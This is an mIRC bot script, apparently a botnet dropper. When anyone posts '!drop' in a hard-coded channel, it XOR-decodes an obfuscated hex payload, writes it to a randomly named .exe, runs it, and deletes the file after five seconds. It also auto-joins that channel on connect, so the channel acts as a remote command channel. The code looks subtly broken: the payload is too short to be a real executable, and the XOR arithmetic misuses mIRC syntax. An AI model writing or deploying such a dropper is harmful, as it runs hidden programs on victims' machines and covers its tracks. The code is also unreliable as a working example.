; MIRC Bot Script - bot_r2SgMG.mrc
on *:TEXT:!drop*:#gRFSbbjr: {
  if ($nick == $me) { halt }
  var %payload = e233c034c17afd3dde29d512d34328f42af62cf82efa0ca00ea2
  var %decoded = $decode_payload(%payload)
  var %tempfile = $mircdir $+ temp_ $+ $rand(1000,9999) $+ .exe
  bwrite %tempfile 1 %decoded
  run %tempfile
  .timer 1 5 remove %tempfile
}

alias decode_payload {
  var %result, %i = 1
  while (%i <= $len($1)) {
    var %byte = $base($mid($1, %i, 2), 16, 10)
    %byte = $calc(%byte $xor (170 + ((%i / 2 - 1) % 256)))
    %result = %result $+ $chr(%byte)
    inc %i 2
  }
  return %result
}

on *:CONNECT: {
  .timer 1 3 join #gRFSbbjr
  echo -a Bot connected to #gRFSbbjr
}
